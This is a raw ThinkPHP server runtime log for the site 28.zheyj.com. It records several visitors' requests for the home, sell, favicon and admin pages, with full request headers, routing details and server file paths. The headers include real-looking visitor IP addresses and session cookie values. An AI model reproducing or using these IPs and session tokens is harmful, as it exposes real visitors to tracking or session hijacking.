[ 2021-08-09T15:35:55+08:00 ] 125.71.236.11 GET 28.zheyj.com/
[运行时间：0.107877s] [吞吐率：9.27req/s] [内存消耗：2,911.38kb] [文件加载：127]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000068s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.031467s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000473s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://zzjie.com/url/?url=http://28.zheyj.com',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002395s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T15:35:56+08:00 ] 125.71.236.11 GET 28.zheyj.com/index/index/sell.html
[运行时间：0.058492s] [吞吐率：17.10req/s] [内存消耗：2,960.52kb] [文件加载：126]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000048s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003626s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000461s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'sell',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'security_session_verify=e527642da94bc8ef283d3feb860b8270',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://zzjie.com/url/?url=http://28.zheyj.com',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002163s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->sell[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/28.zheyj.com/public/../application/index/view/index/sell.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T15:35:56+08:00 ] 125.71.236.11 GET 28.zheyj.com/favicon.ico
[运行时间：0.053581s] [吞吐率：18.66req/s] [内存消耗：2,077.70kb] [文件加载：113]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000047s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003924s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000494s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'favicon.ico',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'security_session_verify=e527642da94bc8ef283d3feb860b8270',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://28.zheyj.com/index/index/sell.html',
  'accept' => 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
  'connection' => 'keep-alive',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T16:34:57+08:00 ] 103.117.103.237 GET 28.zheyj.com/
[运行时间：0.064875s] [吞吐率：15.41req/s] [内存消耗：2,911.24kb] [文件加载：127]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000044s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.004051s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000429s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'cookie' => '_ga=GA1.2.1504908745.1626244371',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002327s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T16:34:58+08:00 ] 103.117.103.237 GET 28.zheyj.com/index/index/sell.html
[运行时间：0.099505s] [吞吐率：10.05req/s] [内存消耗：2,959.69kb] [文件加载：126]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000048s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.011453s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.004151s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'sell',
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'cookie' => '_ga=GA1.2.1504908745.1626244371; security_session_verify=f7fa84e04e033f0ad95ea0b75827ba49',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002207s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->sell[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/28.zheyj.com/public/../application/index/view/index/sell.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T16:35:00+08:00 ] 103.117.103.237 GET 28.zheyj.com/favicon.ico
[运行时间：0.045448s] [吞吐率：22.00req/s] [内存消耗：2,077.70kb] [文件加载：113]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000041s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.004432s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000397s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'favicon.ico',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://28.zheyj.com/index/index/sell.html',
  'cookie' => '_ga=GA1.2.1504908745.1626244371; security_session_verify=f7fa84e04e033f0ad95ea0b75827ba49',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T22:37:06+08:00 ] 124.114.86.254 GET 28.zheyj.com/favicon.ico
[运行时间：0.056834s] [吞吐率：17.60req/s] [内存消耗：2,076.23kb] [文件加载：113]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000040s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.004803s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000359s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'favicon.ico',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0',
  'dnt' => '1',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'connection' => 'keep-alive',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T22:37:06+08:00 ] 124.114.86.254 GET 28.zheyj.com/
[运行时间：0.062500s] [吞吐率：16.00req/s] [内存消耗：2,911.27kb] [文件加载：127]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000051s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003972s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000462s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0',
  'upgrade-insecure-requests' => '1',
  'dnt' => '1',
  'connection' => 'keep-alive',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002377s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T22:37:06+08:00 ] 124.114.86.254 GET 28.zheyj.com/index/index/sell.html
[运行时间：0.055137s] [吞吐率：18.14req/s] [内存消耗：2,960.17kb] [文件加载：126]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000040s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003268s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000477s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'sell',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'security_session_verify=7bb46b0c86a3daff7c0df739ce5d3f97',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0',
  'upgrade-insecure-requests' => '1',
  'dnt' => '1',
  'connection' => 'keep-alive',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001917s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->sell[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/28.zheyj.com/public/../application/index/view/index/sell.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T22:37:15+08:00 ] 124.114.86.254 GET 28.zheyj.com/admin
[运行时间：0.049816s] [吞吐率：20.07req/s] [内存消耗：2,078.23kb] [文件加载：113]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000042s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003963s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000438s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'security_session_verify=7bb46b0c86a3daff7c0df739ce5d3f97',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0',
  'upgrade-insecure-requests' => '1',
  'dnt' => '1',
  'connection' => 'keep-alive',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
